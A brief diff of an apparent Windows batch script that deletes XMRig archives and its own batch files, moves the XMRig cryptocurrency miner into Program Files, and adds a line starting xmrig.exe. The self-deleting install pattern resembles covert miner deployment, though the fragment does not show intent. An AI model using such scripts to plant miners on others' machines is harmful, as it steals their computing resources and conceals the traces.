@@ -7,3 +7,4 @@ del xmrig-6.16.2-gcc-win64.zip
 del xmrig.bat.bak
 del xmrig.bat
 move xmrig-6.16.2 "C:\Program Files"
+start "C:\Program Files\xmrig-6.16.2\xmrig.exe"
